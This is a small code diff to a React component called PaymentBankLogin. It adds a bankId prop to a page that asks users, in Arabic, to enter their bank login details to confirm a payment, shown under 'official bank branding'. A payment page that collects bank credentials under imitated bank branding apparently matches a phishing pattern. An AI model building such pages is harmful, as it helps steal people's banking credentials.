@@ -272,6 +272,7 @@ const PaymentBankLogin = () => {
       title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
       description="أدخل بيانات الدخول للبنك لتأكيد العملية"
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      bankId={selectedBankId}
     >
       {/* Bank Info Header - Enhanced with Official Bank Branding */}
       <div 
